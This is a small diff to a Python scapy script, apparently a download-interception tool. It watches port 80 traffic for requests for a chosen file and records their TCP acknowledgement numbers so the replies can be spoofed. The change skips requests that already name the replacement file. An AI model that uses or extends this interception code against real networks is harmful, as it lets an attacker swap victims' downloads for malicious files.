@@ -23,7 +23,7 @@ def spoof_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             # print (scapy_packet.show())
-            if options.source_file in scapy_packet[scapy.Raw].load:
+            if (options.source_file in scapy_packet[scapy.Raw].load) and (options.dest_file not in scapy_packet[scapy.Raw].load):
                 print ("[+] Request found for {}".format(options.source_file))
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
